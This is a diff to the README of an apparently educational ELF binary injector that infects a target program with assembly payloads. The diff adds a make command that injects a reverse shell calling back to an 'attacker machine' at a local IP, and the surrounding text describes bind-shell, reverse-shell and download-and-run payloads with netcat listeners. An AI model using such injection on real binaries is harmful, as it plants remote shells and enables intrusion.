@@ -36,7 +36,7 @@ To run the default injection with the exec.asm payload, run:
 $ make
 ```
 
-This will compile the injector, a no pie target binary, and the payload.
+This will compile the injector, a no pie test binary, and the payload.
 It will run the injector to attach the payload to the target.
 
 To test run:
@@ -47,6 +47,18 @@ $ ./target
 
 You should see both the message you would've received from an untouched target binary ("TESTING BINARY FOR INJECTION"),
 as well as the output for the command `ls -lah`.
+
+If you want to see the behavior of the original target (before infection), run
+
+```bash
+$ make target
+```
+
+And then:
+
+```bash
+$ ./target
+```
 
 #### Custom Injection
 
@@ -61,12 +73,15 @@ To customize your injection you can use the following parameters:
 - ASM: set the path to the payload source file (default: payloads/exec.asm)
 - IP: set the address for reverse_shell and download
 - PORT: set the port for reverse_shell, download, and bind_shell (default: 9000)
+- BINARY: specify what binary to inject
 
 An example of a custom injection can be:
 
 ```bash
-$ make ASM=payloads/reverse_shell.asm IP=192.168.1.11 PORT=31337 VERBOSE=1
+$ make BINARY=hello_world ASM=payloads/reverse_shell.asm IP=192.168.1.11 PORT=31337 VERBOSE=1
 ```
+
+where the target binary `hello_world` is injected with a reverse shell that will connect to the attacker machine at 192.168.1.11 using port 31337.
 
 #### Payloads
 
@@ -80,6 +95,7 @@ The following are what each payload does and how to use them:
 
 
 **exec.asm**
+
 This will execute `ls -lah` to print all the files.
 It can be tested using the following command:
 
@@ -87,8 +103,10 @@ It can be tested using the following command:
 $ make test_payload ASM=payloads/exec.asm
 ```
 
+<br>
 
 **bind_shell.asm**
+
 This will open a TCP socket at a port specified by the PORT parameter (or 9000 by default).
 From an attacker shell, you can connect to the machine's ip with the port and get a bind shell.
 
@@ -104,8 +122,10 @@ $ nc localhost 8888
 
 Otherwise replace localhost with the IP of the target machine.
 
+<br>
 
 **reverse_shell.asm**
+
 This will connect to a TCP port on an attacking machine using the specified IP and PORT parameters.
 From an attacker shell, you must listen using something like netcat:
 
@@ -119,8 +139,10 @@ And the payload can be tested with the following command (which assumes the atta
 $ make test_payload ASM=payloads/reverse_shell.asm IP=192.168.1.11 PORT=8888
 ```
 
+<br>
 
 **download.asm**
+
 This will download any executable payload (maximum 4096 bytes) using the specified IP and PORT parameters.
 The attacking shell must listen with a file as such:
 
